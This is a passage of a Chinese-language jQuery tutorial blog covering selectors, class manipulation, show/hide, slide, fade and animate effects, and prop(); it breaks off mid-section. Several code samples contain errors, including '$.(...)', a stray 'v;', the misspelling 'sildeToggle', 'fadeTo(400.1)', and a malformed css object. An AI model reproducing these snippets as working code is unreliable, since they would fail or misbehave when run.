class="comment">&lt;!-- 二级导航--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span> </span><br><span class="line">    <span class="comment">&lt;!-- ...--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="keyword">function</span>(<span class="params"></span>)&#123;  <span class="comment">//jQuery入口函数</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//鼠标经过</span></span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">&quot;.nav&gt;li&quot;</span>).<span class="title function_">mouseover</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//$(this) jQuery 当前元素 this 不加引号</span></span></span><br><span class="line"><span class="language-javascript">            <span class="comment">//show()显示元素 hide()隐藏元素</span></span></span><br><span class="line"><span class="language-javascript">            $(<span class="variable language_">this</span>).<span class="title function_">children</span>(<span class="string">&quot;ul&quot;</span>).<span class="title function_">show</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//鼠标离开</span></span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">&quot;.nav&gt;li&quot;</span>).<span class="title function_">mouseout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            $(<span class="variable language_">this</span>).<span class="title function_">children</span>(<span class="string">&quot;ul&quot;</span>).<span class="title function_">hide</span>();</span></span><br><span class="line"><span class="language-javascript">        &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="1.5jquery-筛选方法">1.5jQuery 筛选方法<a title="#1.5jquery-筛选方法" href="#1.5jquery-筛选方法"></a></h5><img src="https://s1.328888.xyz/2022/04/09/Xk3ld.png" style="zoom:67%;" align="left" /><p><strong>注:</strong> **1. **兄弟元素siblings 除了自身元素之外的所有亲兄弟</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;ol .item&quot;</span>).<span class="title function_">siblings</span>(<span class="string">&quot;li&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure><p>**2.**第n个元素</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> index=<span class="number">2</span>;</span><br><span class="line"><span class="comment">//1.选择器</span></span><br><span class="line">$(<span class="string">&quot;ul li:eq(2)&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;blue&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;ul li:eq(&quot;</span>+index+<span class="string">&quot;)&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;blue&quot;</span>);</span><br><span class="line"><span class="comment">//2.选择方法</span></span><br><span class="line">$.(<span class="string">&quot;ul li&quot;</span>).<span class="title function_">eq</span>(<span class="number">2</span>).<span class="title function_">css</span>(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;blue&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;ul li&quot;</span>).<span class="title function_">eq</span>(index).<span class="title function_">css</span>(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;blue&quot;</span>)v;</span><br></pre></td></tr></table></figure><p>**3.**判断是否有某个类名</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;div:first&quot;</span>).<span class="title function_">hasClass</span>(<span class="string">&quot;current&quot;</span>));</span><br></pre></td></tr></table></figure><p>**4.**父子兄关系的获取</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.父 parent() 返回 最近一级的父级元素 亲爸爸</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;.son&quot;</span>).<span class="title function_">parent</span>());</span><br><span class="line"><span class="comment">//2.子 亲儿子 children() 子代选择器 ul&gt;li </span></span><br><span class="line">$(<span class="string">&quot;.nav&quot;</span>).<span class="title function_">children</span>(<span class="string">&quot;p&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br><span class="line"><span class="comment">//     所有孩子 find() 后代选择器</span></span><br><span class="line">$(<span class="string">&quot;.nav&quot;</span>).<span class="title function_">find</span>(<span class="string">&quot;p&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure><p>**5.**返回指定数组的祖先元素</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;one&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;two&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;three&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;four&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;.four&quot;</span>).<span class="title function_">parent</span>().<span class="title function_">parent</span>().<span class="title function_">parent</span>());</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;.four&quot;</span>).<span class="title function_">parents</span>()); <span class="comment">//伪数组的形式</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;.four&quot;</span>).<span class="title function_">parents</span>(<span class="string">&quot;.one&quot;</span>));  <span class="comment">//指定.one</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="1.6jquery-的排他思想">1.6jQuery 的排他思想<a title="#1.6jquery-的排他思想" href="#1.6jquery-的排他思想"></a></h5><p>利用兄弟关系</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.隐式迭代 给所有的按钮的绑定了点击事件</span></span><br><span class="line">$(<span class="string">&quot;button&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//2.当前背景元素发生变化</span></span><br><span class="line">    $(<span class="variable language_">this</span>).<span class="title function_">css</span>(<span class="string">&quot;background&quot;</span>,<span class="string">&quot;pink&quot;</span>);</span><br><span class="line">    <span class="comment">//3.其他兄弟去掉背景颜色</span></span><br><span class="line">    $(<span class="variable language_">this</span>).<span class="title function_">siblings</span>(<span class="string">&quot;button&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;background&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><font size=3 color="red">jQuery得到当前元素的索引号   $(this).index</font></p><h4 id="2.jquery的样式操作">2.jQuery的样式操作<a title="#2.jquery的样式操作" href="#2.jquery的样式操作"></a></h4><h5 id="2.1-操作css方法">2.1 操作css方法<a title="#2.1-操作css方法" href="#2.1-操作css方法"></a></h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;div&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;width&quot;</span>,<span class="string">&quot;300px&quot;</span>);</span><br><span class="line">$(<span class="string">&quot;div&quot;</span>).<span class="title function_">css</span>(<span class="string">&quot;width&quot;</span>,<span class="number">300</span>);</span><br><span class="line"><span class="comment">//属性名 一定得加引号 否则会被认为是变量</span></span><br><span class="line"></span><br><span class="line">$(<span class="string">&quot;div&quot;</span>).<span class="title function_">css</span>(&#123;</span><br><span class="line">    <span class="attr">width</span>:<span class="number">400</span>,</span><br><span class="line">    <span class="attr">height</span>:400px;</span><br><span class="line">    <span class="attr">backgroundColor</span>:<span class="string">&quot;red&quot;</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="2.2设置类样式方法">2.2设置类样式方法<a title="#2.2设置类样式方法" href="#2.2设置类样式方法"></a></h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//1.添加类 addClass</span></span><br><span class="line">    $(<span class="string">&quot;div&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $(<span class="variable language_">this</span>).<span class="title function_">addClass</span>(<span class="string">&quot;current&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">//2.删除类 removeClass</span></span><br><span class="line">    $(<span class="string">&quot;div&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $(<span class="variable language_">this</span>).<span class="title function_">removeClass</span>(<span class="string">&quot;current&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">     <span class="comment">//3.切换类 toggleClass</span></span><br><span class="line">    $(<span class="string">&quot;div&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $(<span class="variable language_">this</span>).<span class="title function_">toggleClass</span>(<span class="string">&quot;current&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//实例 点击上面的li 当前的li 添加current 类 其余兄弟移除该类</span></span><br><span class="line">$(<span class="string">&quot;.tab_list li&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//链式编程操作</span></span><br><span class="line">    $(<span class="variable language_">this</span>).<span class="title function_">addClass</span>(<span class="string">&quot;current&quot;</span>).<span class="title function_">siblings</span>().<span class="title function_">removeClass</span>(<span class="string">&quot;current&quot;</span>);</span><br><span class="line">    <span class="comment">//2.点击的同时 得到当前li的索引号</span></span><br><span class="line">    <span class="keyword">var</span> index=$(<span class="variable language_">this</span>).<span class="title function_">index</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(index);</span><br><span class="line">    <span class="comment">//3.让下部里面的索引号的item显示，其余的让item隐藏</span></span><br><span class="line">    $(<span class="string">&quot;.tab_con .item&quot;</span>).<span class="title function_">eq</span>(index).<span class="title function_">show</span>().<span class="title function_">siblings</span>().<span class="title function_">hide</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h5 id="2.3类操作与classname区别">2.3类操作与className区别<a title="#2.3类操作与classname区别" href="#2.3类操作与classname区别"></a></h5><p>原生js中className会覆盖元素原来里面的类名</p><p>jQuery里面类操作只是对指定类进行操作，不影响原先的类名</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;one&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> one=<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.one&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    one.<span class="property">className</span>=<span class="string">&quot;two&quot;</span>;  <span class="comment">//这里div的类名只有two</span></span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&quot;.one&quot;</span>).<span class="title function_">addClass</span>(<span class="string">&quot;two&quot;</span>); <span class="comment">//这里div的类名 有one two</span></span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    $(<span class="string">&quot;.one&quot;</span>).<span class="title function_">removeClass</span>(<span class="string">&quot;one&quot;</span>); <span class="comment">//这里div的类名 只有two(跟上代码一起)</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="3.jquery效果">3.jQuery效果<a title="#3.jquery效果" href="#3.jquery效果"></a></h4><img src="https://s1.328888.xyz/2022/04/09/XkOP3.png" style="zoom:60%;" align="left" /><h5 id="3.1显示隐藏效果">3.1显示隐藏效果<a title="#3.1显示隐藏效果" href="#3.1显示隐藏效果"></a></h5><ul><li><p>显示语法规范</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">show</span>([speed],[easing],[fn])  <span class="comment">//fn 回调函数 前面做完了才会 实现的函数</span></span><br></pre></td></tr></table></figure></li><li><p>隐藏语法效果</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">hide</span>([speed],[easing],[fn])</span><br></pre></td></tr></table></figure></li><li><p>显示隐藏切换语法效果</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">toggle</span>([speed],[easing],[fn])</span><br></pre></td></tr></table></figure></li><li><p>显示/隐藏/切换参数</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;button&quot;</span>).<span class="title function_">eq</span>(<span class="number">0</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;div&quot;</span>).<span class="title function_">show</span>(<span class="number">1000</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="number">1</span>);  <span class="comment">//完成前面操作之后 弹出窗口</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">     $(<span class="string">&quot;button&quot;</span>).<span class="title function_">eq</span>(<span class="number">0</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;div&quot;</span>).<span class="title function_">hide</span>(<span class="number">1000</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="number">1</span>);  <span class="comment">//完成前面操作之后 弹出窗口</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">     $(<span class="string">&quot;button&quot;</span>).<span class="title function_">eq</span>(<span class="number">0</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $(<span class="string">&quot;div&quot;</span>).<span class="title function_">toggle</span>();  <span class="comment">//一般情况下 我们不加 参数 直接显示隐藏就ok</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="3.2滑动效果">3.2滑动效果<a title="#3.2滑动效果" href="#3.2滑动效果"></a></h5><ul><li><p>上滑效果语法规范</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">slideDown</span>([speed],[easing],[fn])</span><br></pre></td></tr></table></figure></li><li><p>下滑效果语法规范</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">slideUp</span>([speed],[easing],[fn])</span><br></pre></td></tr></table></figure></li><li><p>滑动切换效果语法规范</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">slideToggle</span>([speed],[easing],[fn])</span><br></pre></td></tr></table></figure></li><li><p>上滑/下滑/切换效果参数</p></li></ul><h5 id="3.3事件切换">3.3事件切换<a title="#3.3事件切换" href="#3.3事件切换"></a></h5><ul><li><p>事件切换语法规范</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">hover</span>([over],out)</span><br></pre></td></tr></table></figure></li></ul><p>​       over : 鼠标移到元素上要触发的函数（相当于mouseenter）</p><p>​       out ：鼠标移出元素要触发的函数（相当于mouseleave）</p><p>​       hover就是鼠标经过和离开的复合写法</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;.nav&gt;li&quot;</span>).<span class="title function_">hover</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="variable language_">this</span>).<span class="title function_">children</span>(<span class="string">&quot;ul&quot;</span>).<span class="title function_">slideDown</span>(<span class="number">200</span>);</span><br><span class="line">&#125;,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="variable language_">this</span>).<span class="title function_">children</span>(<span class="string">&quot;ul&quot;</span>).<span class="title function_">slideUp</span>(<span class="number">200</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><font size=3 color="red">事件切换 hover 如果只写一个函数 那么鼠标经过 离开都会触发这个函数</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;.nav&gt;li&quot;</span>).<span class="title function_">hover</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="variable language_">this</span>).<span class="title function_">children</span>(<span class="string">&quot;ul&quot;</span>).<span class="title function_">sildeToggle</span>();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="3.4动画队列及其停止排队方法">3.4动画队列及其停止排队方法<a title="#3.4动画队列及其停止排队方法" href="#3.4动画队列及其停止排队方法"></a></h5><ol><li><p>**动画或效果队列：**动画或者效果一旦触发就会执行，如果多次触发，就造成多个动画或效果排队执行</p></li><li><p>**停止排队：**stop()</p><p>​          stop()方法用于停止动画或效果</p><p>​          注：stop()写到动画或者效果的<font size=3 color="red">前面，相当于停止结束上一次的动画</font></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;.nav&gt;li&quot;</span>).<span class="title function_">hover</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="variable language_">this</span>).<span class="title function_">children</span>(<span class="string">&quot;ul&quot;</span>).<span class="title function_">stop</span>().<span class="title function_">sildeToggle</span>();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h5 id="3.5淡入淡出效果">3.5淡入淡出效果<a title="#3.5淡入淡出效果" href="#3.5淡入淡出效果"></a></h5><ul><li><p>淡入语法规范</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fadeIn</span>([speed],[easing],[fn])</span><br></pre></td></tr></table></figure></li><li><p>淡出语法规范</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fadeOut</span>([speed],[easing],[fn])</span><br></pre></td></tr></table></figure></li><li><p>淡入淡出切换语法规范</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fadeToggle</span>([speed],[easing],[fn])</span><br></pre></td></tr></table></figure></li><li><p>淡入淡出切换参数</p></li><li><p>渐进方式调整到指定的不透明度</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fadeTo</span>([speed],[opacity],[easing],[fn])</span><br></pre></td></tr></table></figure></li><li><p>参数</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;button&quot;</span>).<span class="title function_">eq</span>(<span class="number">0</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//淡入</span></span><br><span class="line">        $(<span class="string">&quot;div&quot;</span>).<span class="title function_">fadeIn</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    $(<span class="string">&quot;button&quot;</span>).<span class="title function_">eq</span>(<span class="number">1</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//淡入</span></span><br><span class="line">        $(<span class="string">&quot;div&quot;</span>).<span class="title function_">fadeOut</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    $(<span class="string">&quot;button&quot;</span>).<span class="title function_">eq</span>(<span class="number">2</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//淡入</span></span><br><span class="line">        $(<span class="string">&quot;div&quot;</span>).<span class="title function_">fadeToggle</span>(<span class="number">1000</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    $(<span class="string">&quot;button&quot;</span>).<span class="title function_">eq</span>(<span class="number">3</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//淡入</span></span><br><span class="line">        $(<span class="string">&quot;div&quot;</span>).<span class="title function_">fadeTo</span>(<span class="number">1000</span>,<span class="number">0.5</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//突出显示 案例</span></span><br><span class="line">$(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//鼠标进入的时候，其他的li标签头透明度0.5</span></span><br><span class="line">    $(<span class="string">&quot;.wrap li&quot;</span>).<span class="title function_">hover</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $(<span class="variable language_">this</span>).<span class="title function_">siblings</span>().<span class="title function_">stop</span>().<span class="title function_">fadeTo</span>(<span class="number">400</span>,<span class="number">0.5</span>);</span><br><span class="line">    &#125;,<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//鼠标离开 其他li 透明度改为 1</span></span><br><span class="line">        $(<span class="variable language_">this</span>).<span class="title function_">siblings</span>().<span class="title function_">stop</span>().<span class="title function_">fadeTo</span>(<span class="number">400.1</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="3.6自定义动画-animate">3.6自定义动画 animate<a title="#3.6自定义动画-animate" href="#3.6自定义动画-animate"></a></h5><ul><li><p>语法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">animate</span>(params,[speed],[easing],[fn])</span><br></pre></td></tr></table></figure></li><li><p>参数</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;button&quot;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;div&quot;</span>).<span class="title function_">animate</span>(&#123;</span><br><span class="line">        <span class="attr">left</span>:<span class="number">500</span>,</span><br><span class="line">        <span class="attr">top</span>:<span class="number">300</span></span><br><span class="line">    &#125;,<span class="number">500</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="4.jquery属性操作">4.jQuery属性操作<a title="#4.jquery属性操作" href="#4.jquery属性操作"></a></h4><h5 id="4.1设置或获取元素固有属性值-prop()">4.1设置或获取元素固有属性值 prop()<a title="#4.1设置或获取元素固有属性值-prop()" href="#4.1设置或获取元素固有属性值-prop()"></a></h5><ul><li><p>获取属性语法：</p><p><code>prop(&quot;属性&quot;)</code></p></li><li><p>设置属性语法：</p><p><code>prop(&quot;属性&quot;,&quot;属性值&quot;)</code></p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">title</span>=<span class="string">&quot;都挺好&quot;</span>&gt;</span>都挺好<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;&quot;</span> <span class="attr">checked</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//element.prop(&quot;属性名&quot;) 获取属性值</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>($(<span class="string">&quot;a&quot;</span>).<span class="title function_">prop</span>(<span class="string">&quot;href&quot;</span>));</span></span><br><span 